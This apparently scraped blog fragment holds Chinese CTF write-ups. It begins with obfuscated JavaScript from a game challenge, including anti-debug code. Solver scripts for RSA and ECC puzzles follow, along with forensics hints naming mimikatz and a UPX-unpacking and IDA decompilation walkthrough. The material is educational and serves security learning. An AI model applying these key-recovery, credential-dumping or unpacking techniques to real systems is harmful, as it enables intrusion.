9;)](generateTree);continue;case\u0026#39;7\u0026#39;:realScore=0xfce+0x1622+-0x8*0x4be;continue;case\u0026#39;8\u0026#39;:platforms=[{\u0026#39;x\u0026#39;:0x32,\u0026#39;w\u0026#39;:0x32}];continue;case\u0026#39;9\u0026#39;:_0x52eac5[_0x556c69(0x2a3,\u0026#39;RTq]\u0026#39;)](generateTree);continue;case\u0026#39;10\u0026#39;:scoreElement[_0x556c69(0x235,\u0026#39;Lj5i\u0026#39;)]=realScore;continue;case\u0026#39;11\u0026#39;:trees=[];continue;case\u0026#39;12\u0026#39;:sticks=[{\u0026#39;x\u0026#39;:_0x52eac5[_0x556c69(0x293,\u0026#39;FmLR\u0026#39;)](platforms[-0xbaf*0x1+-0x1db0+0x295f][\u0026#39;x\u0026#39;],platforms[-0x1322*-0x1+0x10bc+-0x23de][\u0026#39;w\u0026#39;]),\u0026#39;length\u0026#39;:0x0,\u0026#39;rotation\u0026#39;:0x0}];continue;case\u0026#39;13\u0026#39;:_0x52eac5[_0x556c69(0x2cb,\u0026#39;ev%m\u0026#39;)](generatePlatform);continue;case\u0026#39;14\u0026#39;:_0x52eac5[_0x556c69(0x231,\u0026#39;euu1\u0026#39;)](generateTree);continue;case\u0026#39;15\u0026#39;:_0x52eac5[_0x556c69(0x284,\u0026#39;Ye)S\u0026#39;)](generateTree);continue;case\u0026#39;16\u0026#39;:perfectElement[_0x556c69(0x2bd,\u0026#39;ENZE\u0026#39;)][_0x556c69(0x22e,\u0026#39;909%\u0026#39;)]=0x2b*-0x61+-0x2ef+0x133a;continue;case\u0026#39;17\u0026#39;:_0x52eac5[_0x556c69(0x22b,\u0026#39;[(5W\u0026#39;)](generateTree);continue;case\u0026#39;18\u0026#39;:score=-0x81c+0x13e*-0x13+-0x386*-0x9;continue;case\u0026#39;19\u0026#39;:_0x52eac5[_0x556c69(0x296,\u0026#39;Lj5i\u0026#39;)](generatePlatform);continue;case\u0026#39;20\u0026#39;:_0x52eac5[_0x556c69(0x28a,\u0026#39;fEoa\u0026#39;)](generateTree);continue;case\u0026#39;21\u0026#39;:_0x52eac5[_0x556c69(0x27c,\u0026#39;[(5W\u0026#39;)](generateTree);continue;case\u0026#39;22\u0026#39;:_0x52eac5[_0x556c69(0x2b9,\u0026#39;RTq]\u0026#39;)](generateTree);continue;case\u0026#39;23\u0026#39;:restartButton[_0x556c69(0x224,\u0026#39;RTq]\u0026#39;)][_0x556c69(0x28b,\u0026#39;n1#6\u0026#39;)]=_0x52eac5[_0x556c69(0x261,\u0026#39;tjJU\u0026#39;)];continue;case\u0026#39;24\u0026#39;:introductionElement[_0x556c69(0x271,\u0026#39;909%\u0026#39;)][_0x556c69(0x269,\u0026#39;HpW7\u0026#39;)]=0x7ff+0x3c3*-0x9+0x3*0x89f;continue;case\u0026#39;25\u0026#39;:_0x52eac5[_0x556c69(0x23e,\u0026#39;P0I8\u0026#39;)](generateTree);continue;case\u0026#39;26\u0026#39;:heroY=-0x2647+0x115f*0x1+-0xdf*-0x18;continue;case\u0026#39;27\u0026#39;:sceneOffset=-0x20e3+0x19a0*-0x1+0x3a83;continue;case\u0026#39;28\u0026#39;:_0x52eac5[_0x556c69(0x217,\u0026#39;D93x\u0026#39;)](generatePlatform);continue;}break;}},window[_0x308b56(0x282,\u0026#39;^Bu%\u0026#39;)+_0x308b56(0x243,\u0026#39;euu1\u0026#39;)+\u0026#39;e\u0026#39;](animate);}()));function _0x31b643(_0x4d3784){const _0x1b5cb7=_0x3339,_0x2e11ff={\u0026#39;baRek\u0026#39;:function(_0x3ae89c,_0x298245){return _0x3ae89c===_0x298245;},\u0026#39;LFnKE\u0026#39;:_0x1b5cb7(0x2cc,\u0026#39;XFw5\u0026#39;),\u0026#39;jjPcj\u0026#39;:_0x1b5cb7(0x29d,\u0026#39;FmLR\u0026#39;)+_0x1b5cb7(0x244,\u0026#39;FmLR\u0026#39;),\u0026#39;snWzG\u0026#39;:_0x1b5cb7(0x2b7,\u0026#39;euu1\u0026#39;),\u0026#39;pQDkk\u0026#39;:function(_0x58316f,_0x919f2c){return _0x58316f!==_0x919f2c;},\u0026#39;wxaJr\u0026#39;:function(_0x533d4d,_0x1acb92){return _0x533d4d+_0x1acb92;},\u0026#39;rASdw\u0026#39;:function(_0xd361d5,_0xdf57b7){return _0xd361d5/_0xdf57b7;},\u0026#39;Cpfbb\u0026#39;:_0x1b5cb7(0x260,\u0026#39;FmLR\u0026#39;),\u0026#39;WMcgl\u0026#39;:function(_0x2cc482,_0x589f04){return _0x2cc482===_0x589f04;},\u0026#39;GcLFP\u0026#39;:function(_0x5d16a0,_0x3d8692){return _0x5d16a0%_0x3d8692;},\u0026#39;RRSLG\u0026#39;:function(_0x4d7575,_0x3056e4){return _0x4d7575+_0x3056e4;},\u0026#39;tUTKT\u0026#39;:_0x1b5cb7(0x24a,\u0026#39;B*#j\u0026#39;),\u0026#39;YrVgr\u0026#39;:_0x1b5cb7(0x212,\u0026#39;hv\u0026amp;k\u0026#39;),\u0026#39;qMYDX\u0026#39;:_0x1b5cb7(0x2b5,\u0026#39;PDC0\u0026#39;),\u0026#39;xRlnj\u0026#39;:_0x1b5cb7(0x1f3,\u0026#39;XFw5\u0026#39;)+\u0026#39;t\u0026#39;,\u0026#39;DwdqE\u0026#39;:function(_0x4199c1,_0x622c3b){return _0x4199c1(_0x622c3b);},\u0026#39;zjdcx\u0026#39;:function(_0x18e744,_0x3b2871){return _0x18e744(_0x3b2871);}};function _0x4b8a74(_0x37d0a6){const _0x4f6e72=_0x1b5cb7;if(_0x2e11ff[_0x4f6e72(0x25c,\u0026#39;PDC0\u0026#39;)](typeof _0x37d0a6,_0x2e11ff[_0x4f6e72(0x228,\u0026#39;q!6(\u0026#39;)]))return function(_0x156eb6){}[_0x4f6e72(0x277,\u0026#39;HpW7\u0026#39;)+\u0026#39;r\u0026#39;](_0x2e11ff[_0x4f6e72(0x262,\u0026#39;q!6(\u0026#39;)])[_0x4f6e72(0x204,\u0026#39;ENZE\u0026#39;)](_0x2e11ff[_0x4f6e72(0x2ab,\u0026#39;8Q\u0026amp;f\u0026#39;)]);else _0x2e11ff[_0x4f6e72(0x2a6,\u0026#39;XFw5\u0026#39;)](_0x2e11ff[_0x4f6e72(0x25d,\u0026#39;Wx%z\u0026#39;)](\u0026#39;\u0026#39;,_0x2e11ff[_0x4f6e72(0x21a,\u0026#39;HpW7\u0026#39;)](_0x37d0a6,_0x37d0a6))[_0x2e11ff[_0x4f6e72(0x2b4,\u0026#39;YyQk\u0026#39;)]],-0x1139+-0x60e+0x1748)||_0x2e11ff[_0x4f6e72(0x1f0,\u0026#39;a8v%\u0026#39;)](_0x2e11ff[_0x4f6e72(0x226,\u0026#39;D93x\u0026#39;)](_0x37d0a6,0x55d*0x1+-0x121+0x10a*-0x4),0x2093+0x905*0x2+-0x329d)?function(){return!![];}[_0x4f6e72(0x294,\u0026#39;5HLR\u0026#39;)+\u0026#39;r\u0026#39;](_0x2e11ff[_0x4f6e72(0x1f5,\u0026#39;D93x\u0026#39;)](_0x2e11ff[_0x4f6e72(0x2c9,\u0026#39;a8v%\u0026#39;)],_0x2e11ff[_0x4f6e72(0x28d,\u0026#39;a75U\u0026#39;)]))[_0x4f6e72(0x2b3,\u0026#39;Lj5i\u0026#39;)](_0x2e11ff[_0x4f6e72(0x28c,\u0026#39;dA#l\u0026#39;)]):function(){return![];}[_0x4f6e72(0x240,\u0026#39;6Ko7\u0026#39;)+\u0026#39;r\u0026#39;](_0x2e11ff[_0x4f6e72(0x281,\u0026#39;t]@A\u0026#39;)](_0x2e11ff[_0x4f6e72(0x205,\u0026#39;dm1K\u0026#39;)],_0x2e11ff[_0x4f6e72(0x2ca,\u0026#39;909%\u0026#39;)]))[_0x4f6e72(0x237,\u0026#39;XcX^\u0026#39;)](_0x2e11ff[_0x4f6e72(0x1f7,\u0026#39;fEoa\u0026#39;)]);_0x2e11ff[_0x4f6e72(0x2c1,\u0026#39;q!6(\u0026#39;)](_0x4b8a74,++_0x37d0a6);}try{if(_0x4d3784)return _0x4b8a74;else _0x2e11ff[_0x1b5cb7(0x1ee,\u0026#39;kBNH\u0026#39;)](_0x4b8a74,-0x442+-0x1*0x18a7+0x1ce9);}catch(_0x57cc25){}}function _0x271a(){const _0x51c506=[\u0026#39;WQOKW6pcIJtcN8kasSo4v8ouWPVdNa\u0026#39;,\u0026#39;FSontKKRqumaWQ9tWOPcW4y\u0026#39;,\u0026#39;b8kWW6vMFa\u0026#39;,\u0026#39;b8kwWQ/cRSoJ\u0026#39;,\u0026#39;WRhdRNWtgq\u0026#39;,\u0026#39;WOldI8ojW6vq\u0026#39;,\u0026#39;E37cJJKT\u0026#39;,\u0026#39;WQ8OW6ldNIO\u0026#39;,\u0026#39;imonWO0AW4pdJ8kjneNcJW\u0026#39;,\u0026#39;rNn0WQykfW\u0026#39;,\u0026#39;W7FcQhVcKKS\u0026#39;,\u0026#39;W6NcU2xdQCkFFSkosbJcJG\u0026#39;,\u0026#39;WOpdRfyGlq\u0026#39;,\u0026#39;WOtcKCkJoSkX\u0026#39;,\u0026#39;v1jSWRK\u0026#39;,\u0026#39;rSovWRRdVYy\u0026#39;,\u0026#39;aCkpW7FdHCob\u0026#39;,\u0026#39;tSoHWOVdLY8\u0026#39;,\u0026#39;W5tcVhbYWOG\u0026#39;,\u0026#39;WPidW6ldMIa\u0026#39;,\u0026#39;hM4YW7KzsdXpc8kK\u0026#39;,\u0026#39;omo2W5tdLCkbWRqjpCkEWQi\u0026#39;,\u0026#39;W5lcUI3cTmop\u0026#39;,\u0026#39;gMeVW6q\u0026#39;,\u0026#39;gCkdevC2\u0026#39;,\u0026#39;sN98WO3dNq\u0026#39;,\u0026#39;W6pcRLzQWO4\u0026#39;,\u0026#39;jCkGW5LgqmoXWRxdImoqjG\u0026#39;,\u0026#39;v8o9W4JcLCkp\u0026#39;,\u0026#39;xSoKW67cJCoN\u0026#39;,\u0026#39;WPq8WQRdUdNcI8kxs8o9aa\u0026#39;,\u0026#39;W63cUcNcICov\u0026#39;,\u0026#39;ASokdCkSWOa\u0026#39;,\u0026#39;W63dUSkyWRzaW41MW7VcLmkZ\u0026#39;,\u0026#39;h8kRW6FcLCkwW5tdMhm\u0026#39;,\u0026#39;utrRW7hcN1eRWOddLSo6\u0026#39;,\u0026#39;lSk0WPtcJSkc\u0026#39;,\u0026#39;W4RdGGGYDX8/WPldNCk2\u0026#39;,\u0026#39;iCkEbaG\u0026#39;,\u0026#39;l8k3nwO\u0026#39;,\u0026#39;B8oqWOJdTY4\u0026#39;,\u0026#39;W7fce8kR\u0026#39;,\u0026#39;jv7cOL8\u0026#39;,\u0026#39;rx3dJgzR\u0026#39;,\u0026#39;W7/cU07cJ2q\u0026#39;,\u0026#39;WPeAWQWQWQ3dVmkHW4pdQwW\u0026#39;,\u0026#39;kfhcUeyNWPWR\u0026#39;,\u0026#39;s8oiW5/cK8oI\u0026#39;,\u0026#39;nsWPW6JdMG\u0026#39;,\u0026#39;WOlcJ8kYlmkSoGu\u0026#39;,\u0026#39;WOdcHmo1imoOcK3cImouWR5+\u0026#39;,\u0026#39;jmkXi2W\u0026#39;,\u0026#39;WPddRh8jmG\u0026#39;,\u0026#39;d8ksWRbfWOBcQSodyrBcTW\u0026#39;,\u0026#39;W4ddJ8kNFSkTgNBcKCo/WRi\u0026#39;,\u0026#39;l8kwa8oWW7y\u0026#39;,\u0026#39;W6lcOLHfWRe\u0026#39;,\u0026#39;WPalW6eQW7K\u0026#39;,\u0026#39;i8kqgrK\u0026#39;,\u0026#39;W6lcMwtcMfW\u0026#39;,\u0026#39;BxxcJSkFW5u\u0026#39;,\u0026#39;W4RcUcJcPCoJ\u0026#39;,\u0026#39;W7NdJCkJwmkF\u0026#39;,\u0026#39;WQLVW77dIMvjmmo5jSop\u0026#39;,\u0026#39;ySotkSkCWPu\u0026#39;,\u0026#39;W5NcOSk5WPFcJSosna\u0026#39;,\u0026#39;txRcNXKaW40W\u0026#39;,\u0026#39;WQTaymo1CftdKG\u0026#39;,\u0026#39;WOddUgOPja\u0026#39;,\u0026#39;zv7cISknW4e\u0026#39;,\u0026#39;wgtcT8kVEG\u0026#39;,\u0026#39;W4FcO8oRDYy\u0026#39;,\u0026#39;uwflWPxdGG\u0026#39;,\u0026#39;W7etW5NcGGS\u0026#39;,\u0026#39;WQFcN8kJWRBdOsDlsLm\u0026#39;,\u0026#39;W4v4W6WLWQ4\u0026#39;,\u0026#39;pL7dNCotWPi\u0026#39;,\u0026#39;W5pdNSkxxmki\u0026#39;,\u0026#39;h241W6q\u0026#39;,\u0026#39;pHNdRmoVimobW48Wa0KHWRr0WP4\u0026#39;,\u0026#39;fW7cVSoslmoQxhW\u0026#39;,\u0026#39;W5emWQpcI8kX\u0026#39;,\u0026#39;bN7cNuCc\u0026#39;,\u0026#39;y0BcSmkuW6q\u0026#39;,\u0026#39;WP3cISkGjW\u0026#39;,\u0026#39;ASo3WQtdTragChldL8ko\u0026#39;,\u0026#39;e8kyWPRcOmoA\u0026#39;,\u0026#39;WOFdK8oKW5Hl\u0026#39;,\u0026#39;z0NcQ8kZFCkEWRP3oKO\u0026#39;,\u0026#39;kCo9vmoyW5e\u0026#39;,\u0026#39;uflcPmoQcW\u0026#39;,\u0026#39;c1pdUG\u0026#39;,\u0026#39;W6BcTmktWRCnW4TPW6ldG8oOWO3cP8oL\u0026#39;,\u0026#39;txRcRCkFvW\u0026#39;,\u0026#39;WRFdOfqsfa\u0026#39;,\u0026#39;WONcMSkXoG\u0026#39;,\u0026#39;WQ5krSo5Aa\u0026#39;,\u0026#39;EvPcWRVdKW\u0026#39;,\u0026#39;W6RcJ8oBDH4\u0026#39;,\u0026#39;W6P9WQhdK3xdGSoyzG\u0026#39;,\u0026#39;oSk+W6hdUmoq\u0026#39;,\u0026#39;v0hcNYKf\u0026#39;,\u0026#39;W6e7WPlcPmkg\u0026#39;,\u0026#39;sNBcLSkgW5W\u0026#39;,\u0026#39;W7hcJMXcWQ7dTLnqb2q\u0026#39;,\u0026#39;WROTW7ddQJX6amkZ\u0026#39;,\u0026#39;Dmo5W6NcV8ou\u0026#39;,\u0026#39;WPFcPha7emkdEmkuaSkU\u0026#39;,\u0026#39;W5aDWQNcGSkGWQjfW4NcMW\u0026#39;,\u0026#39;WRFcVSk1hSkT\u0026#39;,\u0026#39;WQlcKmk+WQC\u0026#39;,\u0026#39;WQqJW7FdVW\u0026#39;,\u0026#39;rwNcKSkDW5lcIcpdOCo3qG\u0026#39;,\u0026#39;kSkGW79kra\u0026#39;,\u0026#39;W5TKW5S2WPC\u0026#39;,\u0026#39;WOBdJuK8gq\u0026#39;,\u0026#39;etG3W6tdMG\u0026#39;,\u0026#39;imkXgSoeW5Hz\u0026#39;,\u0026#39;Bg7cR8kbW5K\u0026#39;,\u0026#39;W6ZcLbBcJCom\u0026#39;,\u0026#39;W6CPWR7dRmoKgx7cRe4h\u0026#39;,\u0026#39;emkWWOJcQSkM\u0026#39;,\u0026#39;W4b9W4Ki\u0026#39;,\u0026#39;rSovn8kRWQy\u0026#39;,\u0026#39;W4tdImkPEmkT\u0026#39;,\u0026#39;eSkmWQRcRSoYW7qk\u0026#39;,\u0026#39;vSo5W63cLmo8Br4\u0026#39;,\u0026#39;W6C4WPbep8oqWO4gChW\u0026#39;,\u0026#39;twBcTSknwq\u0026#39;,\u0026#39;j8oCWP8A\u0026#39;,\u0026#39;W6tcI25iWQ4\u0026#39;,\u0026#39;W4VdKYilWOBcTG\u0026#39;,\u0026#39;pb7dQ8oVjmk2WPPvmgue\u0026#39;,\u0026#39;WQRdPcJcVCk4ySkhtq\u0026#39;,\u0026#39;WRDeEmo6Fa\u0026#39;,\u0026#39;uxVdK0jF\u0026#39;,\u0026#39;W6L+WRpcQmk2fJJdNfXF\u0026#39;,\u0026#39;WQm6smkxWOC5\u0026#39;,\u0026#39;ymoxWP7dQqm\u0026#39;,\u0026#39;WPTumg9GW6JcTJPqWQRcGq\u0026#39;,\u0026#39;wSoMW6lcHmoHAXlcKSkgW6q\u0026#39;,\u0026#39;W4aXWPFcHSko\u0026#39;,\u0026#39;WQ05rmoiWPfKoCk0W4RcQa\u0026#39;,\u0026#39;WQOQWR7dR8oHgx3cQe4a\u0026#39;,\u0026#39;W4OcWOX8na\u0026#39;,\u0026#39;wCo8a8kUWRW\u0026#39;,\u0026#39;W6pcHIhcTSoI\u0026#39;,\u0026#39;FmoWWP4AhCkUW4dcJ8oPjCkAW51OWOW\u0026#39;,\u0026#39;ECoKtmktWP53WPlcSZNcVLK\u0026#39;,\u0026#39;lqKxW6hdQG\u0026#39;,\u0026#39;bhCNW5Oe\u0026#39;,\u0026#39;W7lcV8oBuWJdPMvuW5rf\u0026#39;,\u0026#39;WObNW4zlDCkkWR9ds1a\u0026#39;,\u0026#39;WPOmD8krWRG\u0026#39;,\u0026#39;WQOJWOpdOLtdGSoJBW\u0026#39;,\u0026#39;WOf6W4yFc8kfWPGfxx8\u0026#39;,\u0026#39;gtFdHmoiWPlcHJpdICozs8kS\u0026#39;,\u0026#39;h8oxWQ4gW6q\u0026#39;,\u0026#39;jxCYW7i/\u0026#39;,\u0026#39;WQ7dRwSVda\u0026#39;,\u0026#39;p8kNW6ldPmofk30\u0026#39;,\u0026#39;s1BcRYKX\u0026#39;,\u0026#39;W7FcSCkdWPVcLq\u0026#39;,\u0026#39;WRW3W7BdPsf9ca\u0026#39;,\u0026#39;rwFcV8k0W5S\u0026#39;,\u0026#39;W7pcRSotsGG\u0026#39;,\u0026#39;W5NdJ8kWbSk0btVdSG\u0026#39;,\u0026#39;h8kSWOFdVCo2WONcU1zqogJdGmo+\u0026#39;,\u0026#39;iCkohCoNW4a\u0026#39;,\u0026#39;WQSTW6RdUdXHgSk+d8o7\u0026#39;,\u0026#39;W7yeoCoXw2NdNx7cMa\u0026#39;,\u0026#39;WPVcOSkCWRldMa\u0026#39;,\u0026#39;Cg/cRmojba\u0026#39;,\u0026#39;rmo0W5y\u0026#39;,\u0026#39;W7ZdHCo1WRtdKtPyF1i\u0026#39;,\u0026#39;W6BcU8ogsGtdU3y\u0026#39;,\u0026#39;f2y1W6aArWm\u0026#39;,\u0026#39;ewmPW7mD\u0026#39;,\u0026#39;o8k8hCopW4KrW4/cHGlcQG\u0026#39;,\u0026#39;WO87W4xdMGm\u0026#39;,\u0026#39;W4ZcPSkYWPxcICohkKn1W6y\u0026#39;,\u0026#39;WPhdGHVdPJ4YmmobWO42WP4cEW\u0026#39;,\u0026#39;vZ48WP3cNmkpDthcT2y\u0026#39;,\u0026#39;W7CeWPz9eW\u0026#39;,\u0026#39;WOu3W5O3W5y\u0026#39;,\u0026#39;BNNdQfTl\u0026#39;,\u0026#39;g0ZcL8oSlCo5W4mbmW\u0026#39;,\u0026#39;i8oOWQGfW40\u0026#39;,\u0026#39;WQVdVY7cUCk4AmkasJRcMq\u0026#39;,\u0026#39;WP/dSx0/bSoF\u0026#39;,\u0026#39;oY8sW4RdHa\u0026#39;,\u0026#39;lCkOn0a8\u0026#39;,\u0026#39;lSkUWRRcMmkG\u0026#39;,\u0026#39;WPtdVf0dbG\u0026#39;,\u0026#39;W5hcJINcHCoL\u0026#39;,\u0026#39;EqCvoSonWPNcMd/dPtS\u0026#39;,\u0026#39;W7KrW4RcNH8\u0026#39;,\u0026#39;WQzcsmotFG\u0026#39;,\u0026#39;W5LfW6ayWO4\u0026#39;,\u0026#39;o8kSeGPx\u0026#39;,\u0026#39;WQ3cKmkHWR8\u0026#39;,\u0026#39;W6eiWRZcHCk2\u0026#39;,\u0026#39;kCkIW5LgqmoX\u0026#39;,\u0026#39;W5ZcRmkHWP3cK8ovpb0\u0026#39;,\u0026#39;AuFcQSk0zSkvWO4\u0026#39;,\u0026#39;W5DgWQT2WQRdVmkXW5tcNtLz\u0026#39;,\u0026#39;WQ8rW5OUW54\u0026#39;,\u0026#39;WP4EmczKWPNcRf1hW5K\u0026#39;,\u0026#39;kCkHW6xdTCoDi2T7\u0026#39;,\u0026#39;FrOqgCoG\u0026#39;,\u0026#39;whT1WO3dGq\u0026#39;,\u0026#39;hSkdWQxcOCk1\u0026#39;,\u0026#39;W7tcK2niWRq\u0026#39;,\u0026#39;W659omkiWPW\u0026#39;,\u0026#39;W4lcIslcN8oJ\u0026#39;,\u0026#39;amkpeJrB\u0026#39;,\u0026#39;k8ktWOJcLmkQ\u0026#39;,\u0026#39;pmkJW7pdRSoB\u0026#39;,\u0026#39;mMO+W4qY\u0026#39;,\u0026#39;vSkPW7NcTvnanYBdVmoz\u0026#39;,\u0026#39;W7vsd8k3WQO\u0026#39;,\u0026#39;uCoTdmk7WRa\u0026#39;,\u0026#39;WQhdK8o+W4LO\u0026#39;,\u0026#39;WP1cv8oXAW\u0026#39;,\u0026#39;BIy8gSoX\u0026#39;,\u0026#39;imonWP4hW4JdPW\u0026#39;,\u0026#39;W6hcQgDxWPC\u0026#39;];_0x271a=function(){return _0x51c506;};return _0x271a();} 显然是被混淆了。试了几个反混淆工具，最终选择了这个 JS Deobfuscator\n然后 flag 就被明文显示了\n这是初代 flag，后来第二遍上的题目用的解决方法和这个一模一样。最开始这道题难度是 hard，重新上来就成了 easy。\nreal check in xor 略（真没啥好写的）\nCrypto fake_n 已知的 fake_n 由 17 个质数相乘得到，未知的 really_n 由其中的 15 个质数相乘得到。really_n 共有 $C_{17}^{15}$ 种可能。不妨爆破：\n1import gmpy2 2from Crypto.Util.number import * 3 4c = 6451324417011540096371899193595274967584961629958072589442231753539333785715373417620914700292158431998640787575661170945478654203892533418902 5primelst = [2215221821, 2290486867, 2333428577, 2361589081, 2446301969, 2507934301, 2590663067, 3107210929, 3278987191, 3389689241, 3417707929, 3429664037, 3716624207, 3859354699, 3965529989, 4098704749, 4267348123] 6 7for i in range(1, 17): 8\tfor j in range(i): 9\ttmplst = [2215221821, 2290486867, 2333428577, 2361589081, 2446301969, 2507934301, 2590663067, 3107210929, 3278987191, 3389689241, 3417707929, 3429664037, 3716624207, 3859354699, 3965529989, 4098704749, 4267348123] 10\tn = 1 11\tphi = 1 12\tdel tmplst[i] 13\tdel tmplst[j] 14\tn = 1 15\tphi = 1 16\tfor k in tmplst: 17\tn *= k 18\tphi *= k - 1 19\te = 65537 20\td = gmpy2.invert(e, phi) 21\tm = pow(c, d, n) 22\tprint(long_to_bytes(m), end = \u0026#39;\\n\\n\u0026#39;) 我玩青水的 后来知道，下面这个方法叫低指数加密攻击：\n1from Crypto.Util.number import * 2import gmpy2 3 4p = 7709388356791362098686964537734555579863438117190798798028727762878684782880904322549856912344789781854618283939002621383390230228555920884200579836394161 5c = 5573755468949553624452023926839820294500672937008992680281196534187840615851844091682946567434189657243627735469507175898662317628420037437385814152733456 6e = 2 7 8jud = 1 9k = 1 10while jud: 11\ty = c + k * p 12\tm, exact = gmpy2.iroot(y, 2) 13\tif exact: 14\tprint(long_to_bytes(m)) 15\tprint(k) 16\tjud = 0 17\tk += 1 OEIS2 改编自强网杯“OEIS”，那一个可以查表。\n题目要计算 $(2^{28} + 5)!$ 各位和的 SHA256，NR289 师傅建议我使用 Sagemath 硬算：\n1import hashlib 2upper = str(gamma(2**28 + 6)) 3res = 0 4for i in upper: 5 res += int(i) 6print(hashlib.sha256(str(res).encode()).hexdigest()) 吃顿饭的工夫就出了。\nhard_ecc 浅看了一点 ECC，这道题已知的量有：圆锥曲线 ec、公钥 Q、基点 T，要求的是私钥。\n1A = [0, 3, 0, 973467756888603754244984534697613606855346504624, 864199516181393560796053875706729531134503137794] 2p = 992366950031561379255380016673152446250935173367 3t = [295622334572794306408950267006569138184895225554, 739097242015870070426694048559637981600496920065, 1] 4q = [282367703408904350779510132139045982196580800466, 411950462764902930006129702137150443195710071159, 1] 5flag_bytes = b\u0026#39;\u0026#39; 6 7ec = EllipticCurve(GF(p), [A[0], A[1], A[2], A[3], A[4]]) 8 9T = ec((t[0], t[1], t[2])) 10Q = ec((q[0], q[1], q[2])) 11 12secret = discrete_log(Q, T, operation= \u0026#39;+\u0026#39;) 13 14flag_bytes = int(secret).to_bytes((secret.bit_length() + 7) // 8, \u0026#39;little\u0026#39;) 15flag = flag_bytes.decode(\u0026#39;utf-8\u0026#39;) 16 17print(flag) Forensics 学取证咯 系列 做出来的前面五道分别使用 cmdscan iehistory mimikatz filescan 可以直接出\n逆向工程(reverse)入门指南 Linux 里使用 pdftotxt，然后可以找到 flag。\nbeginner_Forensics!!!! 用 010 打开，看到是一个 Batch Encryption 混淆，我使用 https://blog.csdn.net/Hunter98234/article/details/108672926 中提供的脚本还原。\n这两天不大舒服，其他题目的复现后边再发 ","link":"https://jackgdn.github.io/post/beginctf-%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/","section":"post","tags":["WP","MISC","Web","Reverse","Crypto","Forensics"],"title":"BeginCTF 解题记录"},{"body":"","link":"https://jackgdn.github.io/tags/web/","section":"tags","tags":null,"title":"Web"},{"body":"春秋杯 - upx2023 程序放进 Exeinfo，其实听名字就知道有壳，但是这个壳改过。\n010 Editor 里看一眼，这个壳改得挺没品的，upx 段标识改回大写后，顺利脱壳。\n进入 IDA 分析：\n1int __fastcall main(int argc, const char **argv, const char **envp) 2{ 3 std::ostream *v3; // rax 4 char *v4; // rax 5 int v6[44]; // [rsp+20h] [rbp-60h] BYREF 6 char v7[16]; // [rsp+D0h] [rbp+50h] BYREF 7 char v8[16]; // [rsp+E0h] [rbp+60h] BYREF 8 char v9[20]; // [rsp+F0h] [rbp+70h] BYREF 9 int v10; // [rsp+104h] [rbp+84h] 10 unsigned int Seed; // [rsp+108h] [rbp+88h] 11 int i; // [rsp+10Ch] [rbp+8Ch] 12 13 _main(); 14 Seed = time(0i64); 15 srand(Seed); 16 std::string::string(v7); 17 std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, Str); 18 std::operator\u0026gt;\u0026gt;\u0026lt;char\u0026gt;(\u0026amp;std::cin, v7); 19 std::string::string(v9, v7); 20 change(v8, v9); 21 std::string::operator=(v7, v8); 22 std::string::~string(v8); 23 std::string::~string(v9); 24 if ( std::string::length(v7) != 42 ) 25 { 26 v3 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;len error\u0026#34;); 27 std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;(v3); 28 exit(0); 29 } 30 qmemcpy(v6, \u0026amp;unk_46A020, 0xA8ui64); 31 for ( i = 0; i \u0026lt;= 41; ++i ) 32 { 33 v10 = rand() % 255; 34 v4 = std::string::operator[](v7, i); 35 if ( (v10 ^ *v4) != v6[i] ) 36 exit(0); 37 } 38 std::string::~string(v7); 39 return 0; 40} 其中 change() 函数如下：\n1std::string *__fastcall change(std::string *a1, std::string *a2) 2{ 3 __int64 v2; // rdi 4 void *v3; // rsp 5 _BYTE *v4; // rax 6 _BYTE v6[32]; // [rsp+0h] [rbp-80h] BYREF 7 __int64 v7[7]; // [rsp+20h] [rbp-60h] BYREF 8 char v8; // [rsp+5Fh] [rbp-21h] BYREF 9 __int64 *v9; // [rsp+60h] [rbp-20h] 10 __int64 v10; // [rsp+68h] [rbp-18h] 11 __int64 v11; // [rsp+70h] [rbp-10h] 12 int v12; // [rsp+7Ch] [rbp-4h] 13 int v13; // [rsp+80h] [rbp+0h] 14 int n; // [rsp+84h] [rbp+4h] 15 int m; // [rsp+88h] [rbp+8h] 16 int k; // [rsp+8Ch] [rbp+Ch] 17 char v17; // [rsp+93h] [rbp+13h] 18 int v18; // [rsp+94h] [rbp+14h] 19 int j; // [rsp+98h] [rbp+18h] 20 int i; // [rsp+9Ch] [rbp+1Ch] 21 22 v7[5] = v6; 23 v13 = 3; 24 std::allocator\u0026lt;char\u0026gt;::allocator(\u0026amp;v6[95]); 25 std::string::string(a1, \u0026amp;unk_47F000, \u0026amp;v8); 26 std::allocator\u0026lt;char\u0026gt;::~allocator(\u0026amp;v8); 27 v12 = std::string::length(a2); 28 v11 = v12 - 1i64; 29 v7[1] = 0i64; 30 v2 = v12; 31 v10 = v13 - 1i64; 32 v7[0] = v11; 33 v7[2] = v12; 34 v7[3] = 0i64; 35 v3 = alloca(16 * ((v12 * v13 + 15) \u0026gt;\u0026gt; 4)); 36 v9 = v7; 37 for ( i = 0; i \u0026lt; v13; ++i ) 38 { 39 for ( j = 0; j \u0026lt; v12; ++j ) 40 *(v9 + j + v2 * i) = 10; 41 } 42 v18 = 0; 43 v17 = 0; 44 for ( k = 0; k \u0026lt; v12; ++k ) 45 { 46 if ( !v18 || v13 - 1 == v18 ) 47 v17 ^= 1u; 48 v4 = std::string::operator[](a2, k); 49 *(v9 + k + v2 * v18) = *v4; 50 if ( v17 ) 51 ++v18; 52 else 53 --v18; 54 } 55 for ( m = 0; m \u0026lt; v13; ++m ) 56 { 57 for ( n = 0; n \u0026lt; v12; ++n ) 58 { 59 if ( *(v9 + n + v2 * m) != 10 ) 60 std::string::operator+=(a1); 61 } 62 } 63 return a1; 64} 打眼一看，这个函数除了该顺序之外没干别的事，遂打断点动调找调整过的顺序顺序。输入 \u0026quot;flag{1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ}\u0026quot;，得到如下顺序：\n1\u0026gt;\u0026gt;\u0026gt; [\u0026#39;flag{1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ}\u0026#39;.index(i) for i in \u0026#39;f{48BFJNRVZlg13579ACEGIKMOQSUWY}a260DHLPTX\u0026#39;] 2[0, 4, 8, 12, 16, 20, 24, 28, 32, 36, 40, 1, 3, 5, 7, 9, 11, 